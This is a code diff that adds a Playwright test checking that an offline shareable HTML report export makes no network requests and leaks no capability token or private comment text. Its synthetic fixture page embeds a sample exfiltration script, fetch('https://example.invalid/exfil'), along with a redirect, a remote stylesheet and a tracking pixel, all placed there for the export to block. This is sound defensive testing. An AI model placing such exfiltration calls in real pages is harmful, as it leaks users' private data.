@@ -20,7 +20,9 @@ from werkzeug.serving import make_server
 import comments
 from execution import comments_server
 from report.models import ReportSpec
+from report.renderers.workspace_script import JS
 from report.renderers.workspace_sections.boot import _comment_boot_data
+from report.shareable import export_shareable_report
 
 _RESULTS = TypeAdapter(dict[str, object])
 _CAPABILITY = "synthetic-browser-canary-capability"
@@ -56,6 +58,62 @@ def browser() -> Generator[Browser]:
             yield instance
         finally:
             instance.close()
+
+
+def test_browser_offline_export_tabs_and_quarters_make_no_network_requests(
+    browser: Browser, tmp_path: Path
+) -> None:
+    boot = json.dumps({"report_capability": _CAPABILITY, "server_url": "http://localhost:7421"})
+    comments = json.dumps({"comments": [{"body": _PRIVATE}]})
+    document = f"""<!doctype html><html><head><title>Synthetic offline report</title>
+<link rel="stylesheet" href="https://example.invalid/font.css">
+<meta http-equiv="refresh" content="0;url=https://example.invalid/leave">
+<style>.tab-group-pane:not(.active) {{ display:none }} [hidden] {{ display:none }}</style>
+</head><body><nav class="tabs report-sidebar">
+<button class="tab active" data-tab="one">One</button>
+<button class="tab" data-tab="two">Two</button></nav>
+<div class="l1-root"><h1>Synthetic analysis</h1>
+<script id="workspace-boot" type="application/json">{boot}</script>
+<script id="workspace-comments" type="application/json">{comments}</script>
+<div class="tab-group-pane active" data-tab-group="one">First section</div>
+<div class="tab-group-pane" data-tab-group="two"><p>Second section</p>
+<div data-quarter-group="earnings"><button data-quarter="Q1">Q1</button>
+<button data-quarter="Q2">Q2</button></div>
+<div data-quarter-card data-quarter-group="earnings" data-quarter="Q1">First quarter</div>
+<div hidden data-quarter-card data-quarter-group="earnings" data-quarter="Q2">Second quarter</div>
+</div><img src="https://example.invalid/pixel"></div>
+<aside id="cmt-sidebar">{_PRIVATE}</aside>
+<script>{JS}</script><script>fetch('https://example.invalid/exfil')</script>
+</body></html>"""
+    source = tmp_path / "original.html"
+    destination = tmp_path / "read-only.html"
+    source.write_text(document, encoding="utf-8")
+    export_shareable_report(source, destination)
+
+    for width in (1440, 768):
+        with browser.new_context(viewport={"width": width, "height": 900}) as context:
+            page = context.new_page()
+            requests: list[str] = []
+            errors: list[str] = []
+            page.on("request", lambda request: requests.append(request.url))
+            page.on("pageerror", lambda error: errors.append(str(error)))
+            # Observe without route interception so CSP and the offline export
+            # must prevent the original remote resources and application calls.
+            page.goto(destination.as_uri())
+            page.get_by_role("button", name="Two", exact=True).click()
+            assert page.locator('[data-tab-group="two"]').evaluate(
+                "el => el.classList.contains('active')"
+            )
+            page.get_by_role("button", name="Q2", exact=True).click()
+            assert page.locator('[data-quarter-card][data-quarter="Q2"]').is_visible()
+            assert not page.locator('[data-quarter-card][data-quarter="Q1"]').is_visible()
+            page.wait_for_timeout(100)
+            assert requests == [destination.as_uri()]
+            assert errors == []
+            assert _CAPABILITY not in page.content()
+            assert _PRIVATE not in page.content()
+    assert source.read_text(encoding="utf-8") == document
+    assert _CAPABILITY in document and _PRIVATE in document
 
 
 def test_browser_origin_capability_and_script_boundaries(
